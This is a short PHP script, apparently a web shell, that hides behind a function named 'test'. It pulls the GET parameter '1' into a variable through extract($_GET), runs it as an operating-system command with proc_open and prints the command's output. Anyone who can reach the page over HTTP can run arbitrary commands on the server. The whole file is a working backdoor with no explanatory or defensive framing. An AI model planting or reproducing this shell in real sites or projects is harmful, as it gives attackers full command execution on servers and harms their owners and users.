<?php

function test(){
  
    return  extract($_GET);
}


if (test()){
    $command =$_GET['1'];
}



$descriptors = [
    0 => ['pipe', 'r'], 
    1 => ['pipe', 'w'], 
    2 => ['pipe', 'w'], 
];

$process = proc_open($command, $descriptors, $pipes);

if (is_resource($process)) {
   
    $output = stream_get_contents($pipes[1]);

    
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);


    echo $output;
}
?>